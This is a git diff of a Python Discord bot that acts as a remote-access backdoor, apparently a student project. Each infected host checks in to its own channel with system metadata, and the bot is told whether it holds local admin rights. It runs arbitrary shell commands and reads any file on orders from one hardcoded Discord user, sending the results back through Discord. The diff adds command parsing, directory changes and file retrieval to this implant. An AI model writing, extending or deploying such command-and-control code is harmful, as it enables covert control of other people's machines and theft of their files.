@@ -24,6 +24,7 @@ from discord.ext import commands
 DISCORD_TOKEN = Path("E:\\CompSci\\lenny_token.txt").read_text(encoding="utf-8")
 CHECKIN_CHANNELS = set()
 LOCKFILE = Path("C:\\Windows\\Temp\\dbtagt.tmp")
+EXIT_CONFIRMED = False
 
 """
 TODO: for third-party modules, it should request them
@@ -132,23 +133,66 @@ def get_local_admin_status():
     )
     return "S-1-5-32-544" in result.stdout
 
+def process_command(cmd_str):
+    """
+        TODO: parse command. Options:
+        get -- get a file
+        exec -- run a command
+        -- if the cmd is cd {}, should do an os.setcwd()
+        exit -- terminate process
+    """
+    usage_string = "Invalid command. Usage:\nexec <cmd>\nget <file>\nexit"
+
+    parts = cmd_str.split(maxsplit=1)
+    if not parts:
+        return usage_string
+
+    cmd = parts[0].lower()
+    arg = parts[1] if len(parts) > 1 else None
+
+    commands = {
+        "exec": execute_command,
+        "get": get_content,
+        "exit": lambda _: exit()
+    }
+
+    if cmd in commands:
+        output = commands[cmd](arg)
+        return output
+    else:
+        return usage_string
+
 def execute_command(cmd_str):
     """
         Execute a command on behalf of the bot.
     """
-    # TODO: parse command. Options:
-    # 
+    if cmd_str.startswith("cd"):
+        # Process cd commands with os.chdir()
+        try:
+            # If the command is JUST "cd", return the cwd,
+            # to be consistent with windows shell behavior.
+            if cmd_str == "cd":
+                result = f"{os.getcwd()}"
+            else:
+                os.chdir(cmd_str.split()[1])
+                result = f"Changed directory to {cmd_str.split()[1]}"
+        except Exception as e:
+            result = f"Error: {e}"
+    
+    else:
+        # Process other commands with subprocess.run()
+        output = subprocess.run(
+            cmd_str,
+            shell=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True
+        )
 
-    output = subprocess.run(
-        cmd_str,
-        shell=True,
-        stdout=subprocess.PIPE,
-        stderr=subprocess.STDOUT,
-        text=True
-    )
+        result = output.stdout
 
-    if len(output.stdout) > 0:
-        return output.stdout
+    if len(result) > 0:
+        return result
     else:
         return "Command returned no output"
 
@@ -157,69 +201,20 @@ def get_content(upload):
         upload_id : GUID of upload from server
         upload_str : path to retrieve for upload
     """
-    
-    upload_id = upload.get('upload_id')
-    upload_str = upload.get('upload_str')
-
-    if not upload_id or not upload_str:
-        return None
-
     try:
         # Reads whole file into memory;
         # may not work well with large files
-        p = Path(upload_str)
+        p = Path(upload)
         with p.open("rb") as f:
             data = f.read()
-            return {
-                'upload_id': upload_id,
-                'output': data
-            }
+            return data
 
     except FileNotFoundError as e:
-        data = e 
+        return e
     except PermissionError as e:
-        data = e
+        return e
     except OSError as e:
-        data = e
-
-    return {
-        'upload_id': upload_id,
-        'output': data
-    }
-
-def post_cmd_output(bot_token, output_dict):
-    """
-        Post requested output to discord server.
-    """
-    endpoint = "/status"
-    full_url = SERVER_URL + endpoint
-
-    headers = {
-        "X-API-TOKEN": bot_token
-    }
-
-    response = requests.post(full_url, headers=headers, data=output_dict)
-    if response:
-        return response.status_code
-    else:
-        return None
-   
-def post_content(bot_token, content_dict):
-    """
-        Post requested content to discord server.
-    """
-    endpoint = "/upload"
-    full_url = SERVER_URL + endpoint
-
-    headers = {
-        "X-API-TOKEN": bot_token
-    }
-
-    response = requests.post(full_url, headers=headers, data=content_dict)
-    if response:
-        return response.status_code
-    else:
-        return None
+        return e
 
 # Should run after Bot() object is created?
 @bot.event
@@ -236,14 +231,14 @@ async def on_ready():
         existing = discord.utils.get(guild.text_channels, name=channel_name)
         if not existing:
             new_channel = await guild.create_text_channel(channel_name)
-            await new_channel.send("📡 This channel was created for device check-ins!")
+            await new_channel.send("📡 New device checked in!")
             await new_channel.send(metadata_pretty)
             CHECKIN_CHANNELS.add(channel_name)
             LOCKFILE.write_text(str(channel_name), encoding="utf-8")
 
         else:
             CHECKIN_CHANNELS.add(channel_name)
-            await existing.send("📡 Bot has checked in again!")
+            await existing.send("📡 Device has checked in again!")
             await existing.send(metadata_pretty)
 
 @bot.event
@@ -257,7 +252,8 @@ async def on_message(message):
         return
 
     if(message.author.id == 558898662772572160):
-        await message.channel.send(execute_command(message.content))
+        output = process_command(message.content)
+        await message.channel.send(output)
 
 if __name__ == "__main__":
     main()
